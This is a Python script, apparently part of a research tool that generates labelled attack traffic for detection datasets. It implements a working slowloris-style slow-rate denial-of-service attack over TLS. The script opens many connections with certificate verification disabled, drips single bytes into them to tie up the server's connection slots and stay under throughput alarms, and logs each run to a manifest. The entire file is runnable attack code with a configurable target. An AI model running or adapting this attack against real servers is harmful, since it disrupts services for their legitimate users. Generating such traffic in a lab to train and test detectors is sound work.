#!/usr/bin/env python3
"""
traffic/attacks/a2_slowloris.py — A2: Slow-rate DoS over TLS.

Opens multiple TLS connections and slowly sends individual bytes every 5-15 seconds
to tie up server connection limits without triggering high-throughput alarms.
"""
import ssl
import socket
import time
import random
import argparse
import os
import sys

REPO_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, REPO_DIR)
from traffic.manifest import ManifestWriter


def run_a2_slowloris(target_ip="10.0.2.10", target_port=8883, conns=15, duration_s=30.0,
                     manifest_path="results/manifest.csv", run_id="run_exp"):
    print(f"[A2 SLOW-RATE DoS] Opening {conns} slow TLS streams against {target_ip}:{target_port} for {duration_s}s")
    writer = ManifestWriter(manifest_path, run_id=run_id)
    start_ts = time.time()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sockets = []
    for _ in range(conns):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            tls = ctx.wrap_socket(s, server_hostname=target_ip)
            tls.connect((target_ip, target_port))
            tls.sendall(b"X-Slow-Header: start\r\n")
            sockets.append(tls)
        except Exception:
            pass

    print(f"[A2 SLOW-RATE DoS] Connected {len(sockets)} streams. Drip feeding bytes...")
    bytes_sent = 0

    while time.time() - start_ts < duration_s:
        for tls in list(sockets):
            try:
                # Send 1-4 bytes
                chunk = bytes([random.randint(65, 90)])
                tls.sendall(chunk)
                bytes_sent += len(chunk)
            except Exception:
                try:
                    tls.close()
                except Exception:
                    pass
                sockets.remove(tls)
        time.sleep(random.uniform(5.0, 10.0))

    for tls in sockets:
        try:
            tls.close()
        except Exception:
            pass

    end_ts = time.time()
    writer.record_episode(
        family="A2_slowloris",
        src_ip="10.0.1.4",
        dst_ip=target_ip,
        dst_port=target_port,
        start_ts=start_ts,
        end_ts=end_ts,
        params={"conns": conns, "active_conns": len(sockets), "bytes_sent": bytes_sent},
    )
    print(f"[A2 SLOW-RATE DoS] Completed episode. Sent {bytes_sent} bytes over slow channels.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="10.0.2.10")
    parser.add_argument("--port", type=int, default=8883)
    parser.add_argument("--conns", type=int, default=15)
    parser.add_argument("--duration", type=float, default=30.0)
    parser.add_argument("--manifest", default="results/manifest.csv")
    parser.add_argument("--run-id", default="run_a2")
    args = parser.parse_args()

    run_a2_slowloris(args.target, args.port, args.conns, args.duration, args.manifest, args.run_id)
